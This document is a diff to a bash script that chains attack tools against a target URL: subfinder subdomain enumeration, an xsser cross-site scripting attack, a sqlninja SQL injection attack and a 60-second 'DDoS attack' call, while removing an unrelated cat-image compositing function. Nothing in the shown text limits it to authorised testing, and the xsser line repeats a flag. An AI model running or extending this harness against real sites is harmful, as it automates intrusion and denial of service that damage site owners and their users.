@@ -214,7 +214,7 @@ perform_subfinder_scan() {
     local target_url="$1"
         local results_dir="$2"
     local result
-    result=$(run_command subfinder -d "$target_url")
+        result=$(run_command subfinder -d "$target_url")
     local output_file="$results_dir/subfinder_scan.txt"
     save_to_file "$output_file" "$result"
     echo "Saved Subfinder scan results to $output_file"
@@ -225,7 +225,7 @@ perform_xss_attack() {
     local target_url="$1"
     local results_dir="$2"
     local result
-    result=$(run_command xsser -u "$target_url" --auto)
+    result=$(run_command xsser --url "$target_url" --auto --Cw=3 --Fp=2 --Is=3 --Wa --Cw=3)
     local output_file="$results_dir/xss_attack.txt"
     save_to_file "$output_file" "$result"
     echo "Saved XSS attack results to $output_file"
@@ -263,21 +263,12 @@ perform_sqlninja_attack() {
     echo "Creating sqlninja config file..."
     echo "[target]" > "$config_file"
     echo "target = $target_url" >> "$config_file"
+    echo "Starting sqlninja attack..."
     local result
     result=$(run_command sqlninja -c "$config_file")
     local output_file="$results_dir/sqlninja_attack.txt"
     save_to_file "$output_file" "$result"
     echo "Saved sqlninja attack results to $output_file"
-}
-
-# Function to modify the image with a cat
-modify_image() {
-    local input_image="$1"
-    local output_image="$2"
-    local cat_image_url="https://example.com/path/to/cat_image.jpg" # Replace with a valid URL of a cat image
-    curl -s -o "/tmp/cat_image.jpg" "$cat_image_url"
-    convert "$input_image" "/tmp/cat_image.jpg" -gravity center -composite "$output_image"
-    echo "Image modified and saved as $output_image"
 }
 
 # Main function to orchestrate the security scans
@@ -326,9 +317,6 @@ main() {
         
         echo "Starting SQL injection with sqlninja..."
         perform_sqlninja_attack "$target_url" "$results_dir"
-        
-        echo "Modifying image..."
-        modify_image "/mnt/data/T545hx7v_400x400.jpg" "$results_dir/modified_image.jpg"
         
         echo "Starting DDoS attack..."
         perform_ddos_attack "$target_url" "60" "$results_dir"  # Run the DDoS attack for 60 seconds
